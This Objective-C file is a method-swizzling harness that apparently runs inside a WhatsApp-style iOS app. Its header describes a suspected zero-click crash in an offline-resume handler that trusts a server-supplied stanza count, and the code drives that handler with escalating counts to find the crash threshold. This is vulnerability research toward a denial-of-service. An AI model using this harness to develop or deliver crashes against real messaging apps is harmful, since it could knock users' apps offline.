// ME73c (t8) — REALISTIC server-count validation for the t7 zero-click lead.
// didOfflineResumeStartWithType:totalStanzasCount: — count is SERVER-SUPPLIED
// (XMPP offline-resume stanza data). ME73 proved 0x7FFFFFFF -> SIGSEGV 10/10.
// Static audit says NO bounds check anywhere in the path — realistic server
// values (0..200,000) are unsafe, not just max int.
//
// ME73c drives the SAME handler with REALISTIC server-plausible counts to find
// the empirical crash threshold:
//    100    (control — ME73 proved this returns normally)
//    1,000
//   10,000
//  100,000
//  200,000
// Each step logged before/after; first crash reveals the threshold. If a
// realistic count crashes, the zero-click claim is strengthened: a server
// sending a normal-looking large batch count kills the app at launch.
//
// Same harness as ME73 (fast constructor, inline drive, marker logging).

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static NSString *wa_markerPath(void) {
    return [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/wafix_marker.txt"];
}

static void wa_marker(NSString *msg) {
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:wa_markerPath()];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:wa_markerPath() contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:wa_markerPath()];
    }
    if (!fh) return;
    @try {
        [fh seekToEndOfFile];
        [fh writeData:[[msg stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    } @catch (NSException *e) {}
}

// signature: didOfflineResumeStartWithType:(NSUInteger)type totalStanzasCount:(NSUInteger)count
static void (*orig_offlineResume)(id, SEL, NSUInteger, NSUInteger);
static void hook_offlineResume(id self, SEL _cmd, NSUInteger type, NSUInteger count) {
    wa_marker([NSString stringWithFormat:@"[hook] didOfflineResumeStartWithType: totalStanzasCount=%lu (self=%@)", (unsigned long)count, NSStringFromClass([self class])]);
    orig_offlineResume(self, _cmd, type, count);
}

static int g_hooked = 0;

static void wa_swizzle(Class cls, SEL sel, IMP newImp, void **origOut) {
    Method m = class_getInstanceMethod(cls, sel);
    if (!m) {
        wa_marker([NSString stringWithFormat:@"[swz] MISSING %@ %@", NSStringFromClass(cls), NSStringFromSelector(sel)]);
        return;
    }
    *origOut = (void *)method_getImplementation(m);
    IMP old = class_replaceMethod(cls, sel, newImp, method_getTypeEncoding(m));
    wa_marker([NSString stringWithFormat:@"[swz] hooked %@ %@ (orig=%p)", NSStringFromClass(cls), NSStringFromSelector(sel), old]);
}

// The realistic server-plausible count ladder. Each entry is logged BEFORE the
// call; if the process dies on that call, the marker shows the last "calling"
// line — that is the empirical crash threshold.
static const NSUInteger kCountLadder[] = {100, 1000, 10000, 100000, 200000};
static const int kLadderSize = 5;

static void run_drive_inline(void) {
    wa_marker(@"[drive] ME73c realistic-count ladder start");
    Class c = NSClassFromString(@"WAMessageBatchingConfigurator");
    if (!c) { wa_marker(@"[drive] WAMessageBatchingConfigurator NOT FOUND"); return; }
    if (!orig_offlineResume) { wa_marker(@"[drive] SKIP (orig not hooked)"); return; }

    __unsafe_unretained id selfObj = class_createInstance(c, 0);
    if (!selfObj) { wa_marker(@"[drive] class_createInstance failed"); return; }

    for (int i = 0; i < kLadderSize; i++) {
        NSUInteger count = kCountLadder[i];
        wa_marker([NSString stringWithFormat:@"[drive] STEP %d/5: calling orig type=1 count=%lu ...", i + 1, (unsigned long)count]);
        orig_offlineResume(selfObj, NSSelectorFromString(@"didOfflineResumeStartWithType:totalStanzasCount:"), 1, count);
        wa_marker([NSString stringWithFormat:@"[drive] STEP %d/5: count=%lu RETURNED (no crash)", i + 1, (unsigned long)count]);
    }
    wa_marker(@"[drive] ME73c ladder complete — NO crash at any realistic count");
}

__attribute__((constructor))
static void waInit(void) {
    @autoreleasepool {
        wa_marker(@"=== waContainerFix ME73c (REALISTIC server-count ladder) constructor ===");

        for (int attempt = 0; attempt < 4; attempt++) {
            if (!g_hooked) {
                Class c = NSClassFromString(@"WAMessageBatchingConfigurator");
                if (c) {
                    wa_swizzle(c, NSSelectorFromString(@"didOfflineResumeStartWithType:totalStanzasCount:"), (IMP)hook_offlineResume, (void **)&orig_offlineResume);
                    if (orig_offlineResume) g_hooked = 1;
                } else {
                    wa_marker(@"[init] WAMessageBatchingConfigurator not loaded yet");
                }
            }
            wa_marker([NSString stringWithFormat:@"[init] attempt %d: hooked=%d", attempt + 1, g_hooked]);
            if (g_hooked) break;
            usleep(250000);
        }
        wa_marker(@"[init] ME73c constructor complete");

        run_drive_inline();
    }
}
